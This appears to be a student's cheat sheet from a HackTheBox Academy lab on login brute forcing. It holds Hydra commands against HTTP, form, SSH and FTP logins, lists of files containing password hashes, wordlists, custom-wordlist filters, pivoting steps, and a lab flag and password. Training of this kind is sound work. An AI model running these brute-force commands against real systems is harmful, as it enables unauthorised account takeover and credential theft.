# Login Brute Forcing  

# Pasword HASH Enumeration  

>Files that can contain hashed passwords for offline brute-forcing:  

| **Windows**   | **Linux**   |
| --------------|-------------------|
| unattend.xml | shadow |
| sysprep.inf | shadow.bak |
| SAM | password / passwd |

# Hydra

| **Command**   | **Description**   |
| --------------|-------------------|
| `hydra -h` | hydra help |
| `hydra -C wordlist.txt SERVER_IP -s PORT http-get /` | Basic Auth Brute Force - Combined Wordlist |
| `hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /` | Basic Auth Brute Force - User/Pass Wordlists |
| `hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"` | Login Form Brute Force - Static User, Pass Wordlist |
| `hydra -L bill.txt -P william.txt -u -f ssh://SERVER_IP:PORT -t 4` | SSH Brute Force - User/Pass Wordlists [Service Authentication Brute Forcing](https://academy.hackthebox.com/module/57/section/491) |
| `hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1` | FTP Brute Force - Static User, Pass Wordlist |
| `hydra -l b.gates -P william.txt ssh://83.136.251.221:53718` | Using what you learned in this section, try to brute force the SSH login of the user "b.gates" in the target server shown above. Then try to SSH into the server. You should find a flag in the home dir. [](https://academy.hackthebox.com/module/57/section/491) |

# Wordlists

| **Lists**   | **Description**   |
| --------------|-------------------|
| `/usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt` | Default Passwords Wordlist [Dictionary Attack - SecLists repo for wordlists](https://github.com/danielmiessler/SecLists) |
| `/usr/share/wordlists/rockyou.txt` | The most Common Passwords Wordlist |
| `/usr/share/seclists/Passwords/Leaked-Databases/rockyou-10.txt` | The seclists Passwords in this Leaked-Databases file rockyou-10 contain 92 entries. |
| `/usr/share/seclists/Usernames/Names/names.txt` | Common Names Wordlist |

# Default Passwords  

>It is very common to find pairs of usernames and passwords used together, especially when default service passwords are kept unchanged.
>[Default Passwords - Login Brute Force](https://academy.hackthebox.com/module/57/section/498) POST Form:  

```
hydra -L /usr/share/seclists/Usernames/Names/names.txt -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-10.txt -f 83.136.251.168 -s 52278 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
```  

>[HYDRA - Brute Forcing Forms](https://academy.hackthebox.com/module/57/section/489)  
>[Username Brute Force](https://academy.hackthebox.com/module/57/section/487)  

![default-passwords HTB{bru73_f0rc1n6_15_4_l457_r350r7}](/images/default-passwords.png)  

>Above screenshot show using Burp Proxy to [Determine Login Parameters](https://academy.hackthebox.com/module/57/section/504)  

# Personalized Wordlists  

| **Command**   | **Description**   |
| --------------|-------------------|
| `cupp -i` | Creating Custom Password Wordlist [Personalized Wordlists](https://academy.hackthebox.com/module/57/section/512) |
| `sed -ri '/^.{,7}$/d' william.txt` | Remove Passwords Shorter Than 8 |
| ```sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt``` | Remove Passwords With No Special Chars |
| `sed -ri '/[0-9]+/!d' william.txt` | Remove Passwords With No Numbers |
| `./username-anarchy Bill Gates > bill.txt` | Generate Usernames List [GITHUB Username Anarchy](https://github.com/urbanadventurer/username-anarchy) |
| `ssh b.gates@SERVER_IP -p PORT` | SSH to Server |
| `ftp 127.0.0.1` | FTP to Server |
| `su - user` | Switch to User |
| `netstat -antp | grep -i list` | Identify internal network services and their ports running on the local victim machine. |
| `scp -P 53718 ./william.txt b.gates@83.136.251.221:/tmp` | Use SCP with the obtain credentials for user `b.gates` and password `4dn1l3M!$` to copy the files to target. |
| `hydra -l m.gates -P /tmp/william.txt ftp://127.0.0.1` | Use `hydra` on the victim locally to identify password of user against internal FTP service. |
